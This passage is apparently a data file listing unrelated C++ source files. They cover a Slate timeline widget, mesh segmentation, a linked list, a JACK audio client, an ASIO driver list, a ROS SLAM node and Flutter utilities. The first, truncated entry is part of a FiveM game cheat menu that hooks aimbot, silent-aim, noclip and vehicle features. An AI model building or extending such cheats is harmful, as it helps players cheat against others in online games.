!Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "#include \"SBXTLTaskTrack.h\"\n#include \"Widgets/Input/SNumericEntryBox.h\"\n#include \"Framework/Application/SlateApplication.h\"\n\n#include \"Widgets/Layout/SBox.h\"\n#include \"Widgets/Layout/SBorder.h\"\n\n#include \"TimelineTrack.h\"\n#include \"BXTLDragDropOp.h\"\n#include \"BXTLTaskTrackPanel.h\"\n#include \"BXTLEditorUtilities.h\" \n\n\n\n#define LOCTEXT_NAMESPACE \"SBXTLTaskTrack\"\n\n#pragma region Important\nvoid SBXTLTaskTrack::Construct(const FArguments& InArgs)\n{\n\tSetClipping(EWidgetClipping::ClipToBounds);\n\n\tCachedTask = InArgs._Task;\n\tController = InArgs._Controller;\n\tViewInputMin = InArgs._ViewInputMin;\n\tViewInputMax = InArgs._ViewInputMax;\n\tInputMin = InArgs._InputMin;\n\tInputMax = InArgs._InputMax;\n\tTrackIndex = InArgs._TrackIndex;\n\tTimelinePlayLength = InArgs._TimelinePlayLength.Get();\n\tSetInputViewRangeEvent = InArgs._SetInputViewRangeEvent;\n\tRefreshPanelEvent = InArgs._RefreshPanelEvent;\n\tSelectNodeEvent = InArgs._SelectNodeEvent;\n\tDeselectNodesEvent = InArgs._DeselectNodesEvent;\n\tAddTaskEvent = InArgs._AddTaskEvent;\n\tDeleteTaskEvent = InArgs._DeleteTaskEvent;\n\tCopyTaskEvent = InArgs._CopyTasksEvent;\n\tPasteTaskEvent = InArgs._PasteTasksEvent;\n\tExportTemplateEvent = InArgs._ExportTemplateEvent;\n\n\tthis->ChildSlot[SAssignNew(TrackArea, SOverlay)];\n\n\tUpdateLayout();\n}\n\nvoid SBXTLTaskTrack::Tick(const FGeometry& AllottedGeometry, const double InCurrentTime, const float InDeltaTime)\n{ \n\tUpdateCachedGeometry(AllottedGeometry); \n\n\tif (TaskNode.IsValid())\n\t{\n\t\tTaskNode->CachedTrackGeometry = AllottedGeometry;\n\t\n\t\tif (!TaskNode->BeingDragged())\n\t\t{\n\t\t\tTaskNode->UpdateSizeAndPosition(AllottedGeometry);\n\t\t}\n\t}\n}\n\nint32 SBXTLTaskTrack::GetTrackIndex() const\n{ \n\treturn TrackIndex; \n}\n\n#pragma endregion Important\n\n\n\n#pragma region Render\nvoid SBXTLTaskTrack::UpdateLayout()\n{\n\tSAssignNew(TaskNode, SBXTLTaskTrackNode)\n\t.Task(CachedTask.Get())\n\t.Controller(Controller)\n\t.ViewInputMin(ViewInputMin)\n\t.ViewInputMax(ViewInputMax)\n\t.TimelinePlayLength(TimelinePlayLength)\n\t.RefreshPanelEvent(RefreshPanelEvent)\n\t.DragTTNEvent(this, &SBXTLTaskTrack::OnNodeDragged, 0);\n\n\tTrackArea->ClearChildren();\n\tTrackArea->AddSlot().Padding(TAttribute<FMargin>::Create(TAttribute<FMargin>::FGetter::CreateSP(this, &SBXTLTaskTrack::GetNotifyTrackPadding)))[TaskNode->AsShared()];\n}\n\n#pragma endregion Render\n\n\n\n#pragma region Menu\nTSharedPtr<SWidget> SBXTLTaskTrack::SummonContextMenu(const FGeometry& MyGeometry, const FPointerEvent& MouseEvent)\n{\n\tTSharedPtr<SWidget> Result = nullptr;\n\n\tFMenuBuilder MenuBuilder(true, nullptr);\n\tMenuBuilder.BeginSection(\"Track\", LOCTEXT(\"NotifyHeading\", \"Track Actions\"));\n\t{\n\t\tMenuBuilder.AddSubMenu\n\t\t(\n\t\t\tNSLOCTEXT(\"AddTaskSubMenu\", \"AddTaskSubMenuAddNotify\", \"Add Task\"),\n\t\t\tNSLOCTEXT(\"AddTaskSubMenu\", \"AddTaskSubMenuAddNotifyToolTip\", \"Add Task\"),\n\t\t\tFNewMenuDelegate::CreateRaw(this, &SBXTLTaskTrack::AddNewTaskMenu)\n\t\t);\n\t\tMenuBuilder.AddMenuEntry\n\t\t(\n\t\t\tNSLOCTEXT(\"CreateGraphNodeMenu\", \"CreateGraphNodeMenuAddNotify\", \"Create Graph Node\"),\n\t\t\tNSLOCTEXT(\"CreateGraphNodeMenu\", \"CreateGraphNodeMenuAddNotifyToolTip\", \"Create Graph Node\"),\n\t\t\tFSlateIcon(),\n\t\t\tFUIAction(FExecuteAction::CreateSP(this, &SBXTLTaskTrack::CreateGraphNode)),\n\t\t\tNAME_None,\n\t\t\tEUserInterfaceActionType::Button\n\t\t);\n\t\tMenuBuilder.AddMenuEntry\n\t\t(\n\t\t\tNSLOCTEXT(\"DeleteTaskSubMenu\", \"DeleteTaskSubMenuAddNotify\", \"Delete Tasks\"),\n\t\t\tNSLOCTEXT(\"DeleteTaskSubMenu\", \"DeleteTaskSubMenuAddNotifyToolTip\", \"Delete Tasks\"),\n\t\t\tFSlateIcon(),\n\t\t\tFUIAction(FExecuteAction::CreateSP(this, &SBXTLTaskTrack::DeleteSelectedTask)),\n\t\t\tNAME_None,\n\t\t\tEUserInterfaceActionType::Button\n\t\t);\n\t\tMenuBuilder.AddMenuEntry\n\t\t(\n\t\t\tNSLOCTEXT(\"CopyTaskSubMenu\", \"CopyTaskSubMenuAddNotify\", \"Copy Tasks\"),\n\t\t\tNSLOCTEXT(\"CopyTaskSubMenu\", \"CopyTaskSubMenuAddNotifyToolTip\", \"Copy Selected Tasks\"),\n\t\t\tFSlateIcon(),\n\t\t\tFUIAction(FExecuteAction::CreateSP(this, &SBXTLTaskTrack::CopyTaskMenu)),\n\t\t\tNAME_None,\n\t\t\tEUserInterfaceActionType::Button\n\t\t);\n\t\tMenuBuilder.AddMenuEntry\n\t\t(\n\t\t\tNSLOCTEXT(\"PasteTaskSubMenu\", \"PasteTaskSubMenuAddNotify\", \"Paste Tasks\"),\n\t\t\tNSLOCTEXT(\"PasteTaskSubMenu\", \"PasteTaskSubMenuAddNotifyToolTip\", \"Paste Selected Tasks into a New Group\"),\n\t\t\tFSlateIcon(),\n\t\t\tFUIAction(FExecuteAction::CreateSP(this, &SBXTLTaskTrack::PasteTaskMenu)),\n\t\t\tNAME_None,\n\t\t\tEUserInterfaceActionType::Button\n\t\t);\n\t\tMenuBuilder.AddMenuEntry\n\t\t(\n\t\t\tNSLOCTEXT(\"ExportTaskTemplateSubMenu\", \"ExportTaskTemplateSubMenuAddNotify\", \"Export Tasks To Template\"),\n\t\t\tNSLOCTEXT(\"ExportTaskTemplateSubMenu\", \"ExportTaskTemplateSubMenuAddNotifyToolTip\", \"Export Selected Tasks To Template\"),\n\t\t\tFSlateIcon(),\n\t\t\tFUIAction(FExecuteAction::CreateSP(this, &SBXTLTaskTrack::ExportTemplateMenu)),\n\t\t\tNAME_None,\n\t\t\tEUserInterfaceActionType::Button\n\t\t);\n\t}\n\tMenuBuilder.EndSection();\n\n\tResult = MenuBuilder.MakeWidget();\n\tFWidgetPath WidgetPath = MouseEvent.GetEventPath() ? *MouseEvent.GetEventPath() : FWidgetPath();\n\tFSlateApplication::Get().PushMenu\n\t(\n\t\tSharedThis(this), WidgetPath, Result.ToSharedRef(), \n\t\tMouseEvent.GetScreenSpacePositi",
    "#include <cstdio>\n#include <vector>\n#include <iostream>\n#include <optional>\n#include <stdexcept>\n#include <cmath>\n#include <unordered_set>\n\n// broc\n#include \"broccommon.h\"\n#include \"brocmath.h\"\n#include \"brocprof.h\"\n#include \"brocrender.h\"\n\n// imgui\n#include <imgui.h>\n\n// openmesh\n#include <OpenMesh/Core/Mesh/TriMesh_ArrayKernelT.hh>\n#include <OpenMesh/Core/IO/MeshIO.hh>\n\nusing u32 = uint32_t;\n\nnamespace brocseg {\nusing OpenMeshT = OpenMesh::TriMesh_ArrayKernelT<>;\n\nstruct Scene {\n  OpenMeshT omMesh;\n  broc::Mesh brocMesh;\n  std::vector<size_t> selectedVertexIndices;\n  float percentile;\n};\n\ninline float curvatureToQuality(float curvature) {\n  return 1.0f / std::exp(curvature);\n}\n\nvoid normalize(std::vector<float> &arr, float percentile) {\n  prof::watch percentileWatch;\n  auto [m, M] = math::percentileThreshold(arr, percentile);\n  std::cout << percentile << \" percentile: [\" << m << \", \" << M << \"]\\n\";\n  std::cout << percentileWatch.report(\"percentile calculation\") << \"\\n\";\n\n  for (auto &c : arr) {\n    c = std::clamp(c, m, M);\n    c = math::remap(c, m, M, 0.0f, 1.0f);\n    c = std::clamp(c, 0.0f, 1.0f);\n  }\n}\n\nvoid colorBy(broc::Mesh &brocMesh, const std::vector<float> &source, float percentile) {\n  return;\n  std::vector<float> normalizedSource{source};\n  normalize(normalizedSource, percentile);\n  for (int vIdx = 0; vIdx < brocMesh.vertices.size(); ++vIdx) {\n    brocMesh.vertices[vIdx].color = math::colorFromNormalized(normalizedSource[vIdx]);\n  }\n  brocMesh.sendGl();\n}\n\nstd::vector<glm::vec3> adjacentVertices(OpenMeshT &omMesh, OpenMeshT::VertexHandle vh) {\n  return omMesh.vv_range(vh).to_vector([&omMesh](const OpenMeshT::VertexHandle &vv) {\n    OpenMeshT::Point p = omMesh.point(vv);\n    return glm::vec3(p[0], p[1], p[2]);\n  });\n}\n\nstd::vector<float> computePerVertexMeanCurvature(broc::Mesh &brocMesh, OpenMeshT &omMesh) {\n  prof::watch w;\n  std::vector<float> rawCurvatures(omMesh.n_vertices());\n  for (OpenMeshT::VertexHandle vh : omMesh.vertices()) {\n    std::vector<glm::vec3> adjacent = adjacentVertices(omMesh, vh);\n    OpenMeshT::Point point = omMesh.point(vh);\n    OpenMeshT::Normal normal = omMesh.normal(vh);\n    glm::vec p = glm::vec3(point[0], point[1], point[2]);\n    glm::vec n = glm::vec3(normal[0], normal[1], normal[2]);\n    float meanCurvature = math::meanCurvature(p, adjacent, n);\n    float gaussianCurvature = math::gaussianCurvature(p, adjacent);\n    float k1 = meanCurvature + std::sqrt(meanCurvature * meanCurvature - gaussianCurvature);\n    float k2 = meanCurvature - std::sqrt(meanCurvature * meanCurvature - gaussianCurvature);\n    rawCurvatures[vh.idx()] = meanCurvature;\n  }\n  std::cout << w.report(\"curvature\") << \"\\n\";\n  return rawCurvatures;\n}\n\nstd::vector<float> energyFromCurvatures(const std::vector<float> &rawCurvatures, float percentile) {\n  std::vector<float> energy = rawCurvatures;\n  auto [minCurvature, maxCurvature] = math::percentileThreshold(energy, percentile);\n\n  float infiniteWeight = 1e8 * energy.size();\n  float minQuality = curvatureToQuality(maxCurvature);\n  float maxQuality = curvatureToQuality(minCurvature);\n  for (size_t i = 0; i < energy.size(); ++i) {\n    float w = curvatureToQuality(energy[i]);\n    energy[i] = w;\n  }\n  return energy;\n}\n\nstd::vector<size_t> colorByBorders(broc::Mesh &brocMesh, OpenMeshT &omMesh, size_t sIdx,\n                                   size_t tIdx, const std::vector<float> &energy) {\n  size_t nVertices = brocMesh.vertices.size();\n  math::flownet g;\n  g.adj_.resize(nVertices);\n  g.capacity_.resize(nVertices);\n  for (OpenMeshT::VertexHandle vh : omMesh.vertices()) {\n    g.capacity_[vh.idx()].resize(nVertices);\n    for (OpenMeshT::HalfedgeHandle he : omMesh.voh_range(vh)) {\n      OpenMeshT::VertexHandle to = omMesh.to_vertex_handle(he);\n      g.adj_[vh.idx()].push_back(to.idx());\n      float infiniteWeight = 1e8 * omMesh.n_vertices();\n      float e1 = energy[vh.idx()];\n      float e2 = energy[to.idx()];\n      float diff = std::abs(e1 - e2);\n      float weight = (diff > math::EPS) ? (1.0 / diff) : std::numeric_limits<i32>::max();\n      if (std::abs(e1) > 100 || std::abs(e2) > 100) {\n        weight = 0.0f;\n      }\n      g.capacity_[vh.idx()][to.idx()] = static_cast<i32>(weight);\n    }\n  }\n  std::vector<size_t> result = g.mincut(sIdx, tIdx);\n\n  {\n    std::unordered_set<size_t> setResult(result.begin(), result.end());\n    for (OpenMeshT::VertexHandle vh : omMesh.vertices()) {\n      bool allNeighborsSelected = true;\n      for (OpenMeshT::VertexHandle vv : omMesh.vv_range(vh)) {\n        if (setResult.find(vv.idx()) == setResult.end()) {\n          allNeighborsSelected = false;\n        }\n      }\n      if (allNeighborsSelected && setResult.find(vh.idx()) == setResult.end()) {\n        result.push_back(vh.idx());\n      }\n    }\n  }\n\n  return result;\n}\n\nvoid translateToOrigin(broc::Mesh &brocMesh) {\n  math::BBox box;\n  for (const auto &v : brocMesh.vertices) {\n    box.addPoint(v.pos);\n  }\n  glm::vec3 translate = -1.0f * (box.maxp + box.minp) / 2.0f;\n  glm::vec3 diag ",
    "#include <iostream>\n\nclass Node {\n public:\n  Node(int key) { this->Key = key; }\n\n  int Key;\n  Node *Next = nullptr;\n  Node *Prev = nullptr;\n};\n\nclass DoubleLinkedList {\n public:\n  DoubleLinkedList() {}\n  ~DoubleLinkedList() { DestroyList(this->Head); }\n  void Append(int key);\n  void Prepend(int key);\n  Node *GetAt(size_t index);\n  void Shift();\n  void Pop();\n  void Print(Node *node);\n\n  Node *Head = nullptr, *Tail = nullptr;\n\n private:\n  static void DestroyList(Node *node) {\n    if (node) {\n      DestroyList(node->Next);\n      delete node;\n    }\n  }\n};\n\nvoid DoubleLinkedList::Append(int key) {\n  Node *newNode = new Node(key);\n  newNode->Prev = this->Tail;\n\n  if (this->Tail != nullptr) this->Tail->Next = newNode;\n  if (!this->Head) this->Head = newNode;\n\n  this->Tail = newNode;\n}\n\nvoid DoubleLinkedList::Prepend(int key) {\n  Node *newNode = new Node(key);\n  newNode->Next = this->Head;\n\n  if (this->Head != nullptr) this->Head->Prev = newNode;\n  if (!this->Tail) this->Tail = newNode;\n\n  this->Head = newNode;\n}\n\nvoid DoubleLinkedList::Shift() {\n  if (!this->Head) return;\n\n  Node *tmp = this->Head->Next;\n\n  if (tmp != nullptr) {\n    tmp->Prev = nullptr;\n  } else {\n    this->Tail = nullptr;\n  }\n\n  delete this->Head;\n  this->Head = tmp;\n}\n\nvoid DoubleLinkedList::Pop() {\n  if (!this->Tail) return;\n  Node *tmp = this->Tail->Prev;\n\n  if (tmp != nullptr) {\n    tmp->Next = nullptr;\n  } else {\n    this->Head = nullptr;\n  }\n\n  delete this->Tail;\n  this->Tail = tmp;\n}\n\nNode *DoubleLinkedList::GetAt(size_t index) {\n  size_t i = 0;\n  Node *cur = this->Head;\n  while (cur) {\n    if (i == index) return cur;\n\n    cur = cur->Next;\n    i++;\n  }\n\n  return nullptr;\n}\n\nvoid DoubleLinkedList::Print(Node *node) {\n  if (!node) return;\n  std::cout << node->Key << \" \";\n  Print(node->Next);\n}\n\nint main() {\n  DoubleLinkedList list = DoubleLinkedList();\n  list.Append(5);\n  list.Append(6);\n  list.Prepend(1);\n  list.Shift();\n  std::cout << list.GetAt(0)->Key << std::endl;\n\n  list.Print(list.Head);\n}",
    "/**\n * passthrough_client.cpp\n *\n * Copyright (C) 2023-2024  Pablo Alvarado\n * EL5805 Procesamiento Digital de Se\u00f1ales\n * Escuela de Ingenier\u00eda Electr\u00f3nica\n * Tecnol\u00f3gico de Costa Rica\n *\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n * 1. Redistributions of source code must retain the above copyright notice,\n *    this list of conditions and the following disclaimer.\n *\n * 2. Redistributions in binary form must reproduce the above copyright notice,\n *    this list of conditions and the following disclaimer in the documentation\n *    and/or other materials provided with the distribution.\n *\n * 3. Neither the name of the authors nor the names of its contributors may be\n *    used to endorse or promote products derived from this software without\n *    specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n */\n\n#include \"passthrough_client.h\"\n\n#include <cstring>\n\npassthrough_client::passthrough_client() : jack::client() {\n}\n\npassthrough_client::~passthrough_client() {\n}\n  \n/**\n * The process callback for this JACK application is called in a\n * special realtime thread once for each audio cycle.\n *\n * This client does nothing more than copy data from its input\n * port to its output port. It will exit when stopped by \n   * the user (e.g. using Ctrl-C on a unix-ish operating system)\n   */\nbool passthrough_client::process(jack_nframes_t nframes,\n                                 const sample_t *const in,\n                                 sample_t *const out) {\n  memcpy (out, in, sizeof(sample_t)*nframes);\n  return true;\n}\n  \n",
    "#include <windows.h>\n#include \"iasiodrv.h\"\n#include \"asiolist.h\"\n\n#define ASIODRV_DESC\t\t\"description\"\n#define INPROC_SERVER\t\t\"InprocServer32\"\n#define ASIO_PATH\t\t\t\"software\\\\asio\"\n#define COM_CLSID\t\t\t\"clsid\"\n\n// ******************************************************************\n// Local Functions \n// ******************************************************************\nstatic LONG findDrvPath (char *clsidstr,char *dllpath,int dllpathsize)\n{\n\tHKEY\t\t\thkEnum,hksub,hkpath;\n\tchar\t\t\tdatabuf[512];\n\tLONG \t\t\tcr,rc = -1;\n\tDWORD\t\t\tdatatype,datasize;\n\tDWORD\t\t\tindex;\n\tOFSTRUCT\t\tofs;\n\tHFILE\t\t\thfile;\n\tBOOL\t\t\tfound = FALSE;\n\n#ifdef UNICODE\n\tCharLowerBuffA(clsidstr,strlen(clsidstr));\n\tif ((cr = RegOpenKeyA(HKEY_CLASSES_ROOT,COM_CLSID,&hkEnum)) == ERROR_SUCCESS) {\n\n\t\tindex = 0;\n\t\twhile (cr == ERROR_SUCCESS && !found) {\n\t\t\tcr = RegEnumKeyA(hkEnum,index++,databuf,512);\n\t\t\tif (cr == ERROR_SUCCESS) {\n\t\t\t\tCharLowerBuffA(databuf,strlen(databuf));\n\t\t\t\tif (!(strcmp(databuf,clsidstr))) {\n\t\t\t\t\tif ((cr = RegOpenKeyExA(hkEnum,databuf,0,KEY_READ,&hksub)) == ERROR_SUCCESS) {\n\t\t\t\t\t\tif ((cr = RegOpenKeyExA(hksub,INPROC_SERVER,0,KEY_READ,&hkpath)) == ERROR_SUCCESS) {\n\t\t\t\t\t\t\tdatatype = REG_SZ; datasize = (DWORD)dllpathsize;\n\t\t\t\t\t\t\tcr = RegQueryValueEx(hkpath,0,0,&datatype,(LPBYTE)dllpath,&datasize);\n\t\t\t\t\t\t\tif (cr == ERROR_SUCCESS) {\n\t\t\t\t\t\t\t\tmemset(&ofs,0,sizeof(OFSTRUCT));\n\t\t\t\t\t\t\t\tofs.cBytes = sizeof(OFSTRUCT); \n\t\t\t\t\t\t\t\thfile = OpenFile(dllpath,&ofs,OF_EXIST);\n\t\t\t\t\t\t\t\tif (hfile) rc = 0; \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tRegCloseKey(hkpath);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tRegCloseKey(hksub);\n\t\t\t\t\t}\n\t\t\t\t\tfound = TRUE;\t// break out \n\t\t\t\t}\n\t\t\t}\n\t\t}\t\t\t\t\n\t\tRegCloseKey(hkEnum);\n\t}\n#else\n\tCharLowerBuff(clsidstr,strlen(clsidstr));\n\tif ((cr = RegOpenKey(HKEY_CLASSES_ROOT,COM_CLSID,&hkEnum)) == ERROR_SUCCESS) {\n\n\t\tindex = 0;\n\t\twhile (cr == ERROR_SUCCESS && !found) {\n\t\t\tcr = RegEnumKey(hkEnum,index++,databuf,512);\n\t\t\tif (cr == ERROR_SUCCESS) {\n\t\t\t\tCharLowerBuff(databuf,strlen(databuf));\n\t\t\t\tif (!(strcmp(databuf,clsidstr))) {\n\t\t\t\t\tif ((cr = RegOpenKeyEx(hkEnum,databuf,0,KEY_READ,&hksub)) == ERROR_SUCCESS) {\n\t\t\t\t\t\tif ((cr = RegOpenKeyEx(hksub,INPROC_SERVER,0,KEY_READ,&hkpath)) == ERROR_SUCCESS) {\n\t\t\t\t\t\t\tdatatype = REG_SZ; datasize = (DWORD)dllpathsize;\n\t\t\t\t\t\t\tcr = RegQueryValueEx(hkpath,0,0,&datatype,(LPBYTE)dllpath,&datasize);\n\t\t\t\t\t\t\tif (cr == ERROR_SUCCESS) {\n\t\t\t\t\t\t\t\tmemset(&ofs,0,sizeof(OFSTRUCT));\n\t\t\t\t\t\t\t\tofs.cBytes = sizeof(OFSTRUCT); \n\t\t\t\t\t\t\t\thfile = OpenFile(dllpath,&ofs,OF_EXIST);\n\t\t\t\t\t\t\t\tif (hfile) rc = 0; \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tRegCloseKey(hkpath);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tRegCloseKey(hksub);\n\t\t\t\t\t}\n\t\t\t\t\tfound = TRUE;\t// break out \n\t\t\t\t}\n\t\t\t}\n\t\t}\t\t\t\t\n\t\tRegCloseKey(hkEnum);\n\t}\n#endif\n\treturn rc;\n}\n\n\nstatic LPASIODRVSTRUCT newDrvStruct (HKEY hkey,char *keyname,int drvID,LPASIODRVSTRUCT lpdrv)\n{\n\tHKEY\thksub;\n\tchar\tdatabuf[256];\n\tchar\tdllpath[MAXPATHLEN];\n\tWORD\twData[100];\n\tCLSID\tclsid;\n\tDWORD\tdatatype,datasize;\n\tLONG\tcr,rc;\n\n\tif (!lpdrv) {\n\t\tif ((cr = RegOpenKeyExA(hkey,keyname,0,KEY_READ,&hksub)) == ERROR_SUCCESS) {\n\n\t\t\tdatatype = REG_SZ; datasize = 256;\n\t\t\tcr = RegQueryValueExA(hksub,COM_CLSID,0,&datatype,(LPBYTE)databuf,&datasize);\n\t\t\tif (cr == ERROR_SUCCESS) {\n\t\t\t\trc = findDrvPath (databuf,dllpath,MAXPATHLEN);\n\t\t\t\tif (rc == 0) {\n\t\t\t\t\tlpdrv = new ASIODRVSTRUCT[1];\n\t\t\t\t\tif (lpdrv) {\n\t\t\t\t\t\tmemset(lpdrv,0,sizeof(ASIODRVSTRUCT));\n\t\t\t\t\t\tlpdrv->drvID = drvID;\n\t\t\t\t\t\tMultiByteToWideChar(CP_ACP,0,(LPCSTR)databuf,-1,(LPWSTR)wData,100);\n\t\t\t\t\t\tif ((cr = CLSIDFromString((LPOLESTR)wData,(LPCLSID)&clsid)) == S_OK) {\n\t\t\t\t\t\t\tmemcpy(&lpdrv->clsid,&clsid,sizeof(CLSID));\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tdatatype = REG_SZ; datasize = 256;\n\t\t\t\t\t\tcr = RegQueryValueExA(hksub,ASIODRV_DESC,0,&datatype,(LPBYTE)databuf,&datasize);\n\t\t\t\t\t\tif (cr == ERROR_SUCCESS) {\n\t\t\t\t\t\t\tstrcpy(lpdrv->drvname,databuf);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse strcpy(lpdrv->drvname,keyname);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tRegCloseKey(hksub);\n\t\t}\n\t}\t\n\telse lpdrv->next = newDrvStruct(hkey,keyname,drvID+1,lpdrv->next);\n\n\treturn lpdrv;\n}\n\nstatic void deleteDrvStruct (LPASIODRVSTRUCT lpdrv)\n{\n\tIASIO\t*iasio;\n\n\tif (lpdrv != 0) {\n\t\tdeleteDrvStruct(lpdrv->next);\n\t\tif (lpdrv->asiodrv) {\n\t\t\tiasio = (IASIO *)lpdrv->asiodrv;\n\t\t\tiasio->Release();\n\t\t}\n\t\tdelete lpdrv;\n\t}\n}\n\n\nstatic LPASIODRVSTRUCT getDrvStruct (int drvID,LPASIODRVSTRUCT lpdrv)\n{\n\twhile (lpdrv) {\n\t\tif (lpdrv->drvID == drvID) return lpdrv;\n\t\tlpdrv = lpdrv->next;\n\t}\n\treturn 0;\n}\n// ******************************************************************\n\n\n// ******************************************************************\n//\tAsioDriverList\n// ******************************************************************\nAsioDriverList::AsioDriverList ()\n{\n\tHKEY\t\t\thkEnum = 0;\n\tchar\t\t\tkeyname[MAXDRVNAMELEN];\n\tLPASIODRVSTRUCT\tpdl;\n\tLONG \t\t\tcr;\n\tDWORD\t\t\tindex = 0;\n\tBOOL\t\t\tfin = FALSE;\n\n\tnumdrv\t\t= 0;\n\tlpdrvlist\t= 0;\n\n#ifdef UNICODE\n\tcr = RegOpenKeyA(HKEY_LOCAL_MACHINE,ASIO_PATH,&hkEnum);\n#else\n\tcr = RegOpenKey(HKEY_LOCAL_MACHINE,ASIO_PATH,&hkEnum);\n#endif\n\twhile (cr == ERROR_SUCCESS) {\n#ifdef UNICODE\n\t\tif ((cr = RegEnumKeyA(hkEnum,index++,keyname,MAXDRVNAMELEN))== ERR",
    "/*\n * DataProcessorRos.cpp\n *\n *  Created on: Apr 21, 2022\n *      Author: jelavice\n */\n\n#include \"open3d_slam_ros/DataProcessorRos.hpp\"\n#include <ros/ros.h>\n#include <sensor_msgs/PointCloud2.h>\n#include \"open3d_slam/magic.hpp\"\n#include \"open3d_slam/typedefs.hpp\"\n\nnamespace o3d_slam {\n\nDataProcessorRos::DataProcessorRos(ros::NodeHandlePtr nh) : nh_(nh) {}\n\nvoid DataProcessorRos::initCommonRosStuff() {\n  cloudTopic_ = nh_->param<std::string>(\"cloud_topic\", \"\");\n  std::cout << \"Cloud topic is given as \" << cloudTopic_ << std::endl;\n  rawCloudPub_ = nh_->advertise<sensor_msgs::PointCloud2>(\"raw_cloud\", 1, true);\n  numAccumulatedRangeDataDesired_ = nh_->param<int>(\"num_accumulated_range_data\", 1);\n  std::cout << \"Num accumulated range data: \" << numAccumulatedRangeDataDesired_ << std::endl;\n}\n\nvoid DataProcessorRos::processMeasurement(const PointCloud& cloud, const Time& timestamp) {\n  std::cout << \"Warning you have not implemented processMeasurement!!! \\n\";\n}\n\nstd::shared_ptr<SlamWrapper> DataProcessorRos::getSlamPtr() {\n  return slam_;\n}\n\nvoid DataProcessorRos::accumulateAndProcessRangeData(const PointCloud& cloud, const Time& timestamp) {\n  const size_t minNumCloudsReceived = magic::skipFirstNPointClouds;\n  if (numPointCloudsReceived_ < minNumCloudsReceived) {\n    ++numPointCloudsReceived_;\n    return;\n    // somehow the first cloud can be missing a lot of points when running with ouster os-128 on the robot\n    // if we skip that first measurement, it all works okay\n    // we skip first five, just to be extra safe\n  }\n\n  accumulatedCloud_ += cloud;\n  ++numAccumulatedRangeDataCount_;\n  if (numAccumulatedRangeDataCount_ < numAccumulatedRangeDataDesired_) {\n    return;\n  }\n\n  if (accumulatedCloud_.IsEmpty()) {\n    std::cout << \"Trying to insert and empyt cloud!!! Skipping the measurement \\n\";\n    return;\n  }\n\n  processMeasurement(accumulatedCloud_, timestamp);\n\n  numAccumulatedRangeDataCount_ = 0;\n  accumulatedCloud_.Clear();\n}\n\n}  // namespace o3d_slam\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    